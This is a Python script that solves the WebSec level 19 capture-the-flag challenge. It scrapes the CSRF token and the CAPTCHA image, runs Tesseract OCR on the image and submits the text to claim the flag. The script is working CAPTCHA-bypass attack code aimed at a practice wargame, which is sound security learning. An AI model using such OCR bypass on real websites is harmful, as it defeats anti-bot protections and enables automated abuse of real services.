#!/usr/bin/env python3
import requests
import re
import base64
from PIL import Image, ImageEnhance, ImageFilter
from io import BytesIO
import subprocess
import sys

print("╔════════════════════════════════════════════════════════════╗")
print("║    WebSec Level 19 - OCR-based CAPTCHA Solver             ║")
print("╚════════════════════════════════════════════════════════════╝\n")

# Paso 1: Obtener la página y extraer el CAPTCHA
print("[1] Fetching page and extracting CAPTCHA image...")
session = requests.Session()
response = session.get("https://websec.fr/level19/index.php")

# Extraer el token CSRF
csrf_match = re.search(r'name="token" value="([^"]+)"', response.text)
if not csrf_match:
    print("[-] Could not extract CSRF token")
    sys.exit(1)

csrf_token = csrf_match.group(1)
print(f"[+] CSRF Token: {csrf_token}")

# Extraer la imagen base64
img_match = re.search(r'data:image/png;base64,([^"]+)', response.text)
if not img_match:
    print("[-] Could not extract CAPTCHA image")
    sys.exit(1)

img_data = base64.b64decode(img_match.group(1))
print(f"[+] CAPTCHA image extracted ({len(img_data)} bytes)")

# Paso 2: Procesar la imagen
print("\n[2] Processing image for OCR...")
img = Image.open(BytesIO(img_data))
print(f"[+] Image size: {img.size}")

# Guardar la imagen original
img.save('/workspace/websec_level19/captcha_original.png')
print("[+] Saved original: captcha_original.png")

# Convertir a escala de grises
img_gray = img.convert('L')

# Aumentar el contraste
enhancer = ImageEnhance.Contrast(img_gray)
img_contrast = enhancer.enhance(3.0)

# Binarizar la imagen (umbral)
threshold = 128
img_binary = img_contrast.point(lambda x: 0 if x < threshold else 255, '1')

# Guardar la imagen procesada
img_binary.save('/workspace/websec_level19/captcha_processed.png')
print("[+] Saved processed: captcha_processed.png")

# Paso 3: Intentar OCR
print("\n[3] Attempting OCR...")

# Intentar con diferentes configuraciones de Tesseract
configs = [
    '--psm 7',  # Treat image as a single text line
    '--psm 8',  # Treat image as a single word
    '--psm 6',  # Assume a single uniform block of text
]

results = []
for config in configs:
    try:
        result = subprocess.run(
            ['tesseract', '/workspace/websec_level19/captcha_processed.png', 'stdout', config],
            capture_output=True,
            text=True,
            timeout=5
        )
        text = result.stdout.strip()
        # Limpiar el resultado: solo caracteres alfanuméricos
        text_clean = ''.join(c for c in text if c.isalnum())
        if text_clean:
            results.append(text_clean)
            print(f"  [*] OCR (config '{config}'): {text_clean}")
    except Exception as e:
        print(f"  [-] OCR failed with config '{config}': {e}")

if not results:
    print("[-] OCR failed to extract any text")
    print("[*] Manual inspection required. Check captcha_original.png")
    sys.exit(1)

# Usar el resultado más común o el primero
captcha_text = results[0] if results else ""

# Intentar con diferentes longitudes (sabemos que debería ser 25 caracteres)
print(f"\n[4] Best guess: {captcha_text} (length: {len(captcha_text)})")

if len(captcha_text) != 25:
    print(f"[!] Warning: Expected 25 characters, got {len(captcha_text)}")

# Paso 4: Enviar el CAPTCHA
print("\n[5] Submitting CAPTCHA...")
data = {
    'captcha': captcha_text,
    'token': csrf_token,
    'submit': ''
}

result = session.post("https://websec.fr/level19/index.php", data=data)

if 'Password recovery email sent' in result.text:
    print("\n╔════════════════════════════════════════════════════════════╗")
    print("║                   🎉 SUCCESS! 🎉                         ║")
    print("╠════════════════════════════════════════════════════════════╣")
    
    flag_match = re.search(r'WEBSEC\{[^}]+\}', result.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"║                                                            ║")
        print(f"║  FLAG: {flag:49} ║")
        print(f"║                                                            ║")
        with open('/workspace/websec_level19/FLAG.txt', 'w') as f:
            f.write(flag + '\n')
        print("║  (Saved to FLAG.txt)                                       ║")
    
    print("╚════════════════════════════════════════════════════════════╝")
else:
    print("[-] CAPTCHA submission failed")
    if 'Invalid captcha' in result.text:
        print("[-] Server says: Invalid captcha")
        print(f"[-] We sent: {captcha_text}")
        print("[-] Check the saved images manually")
    elif 'Invalid session token' in result.text:
        print("[-] Server says: Invalid session token")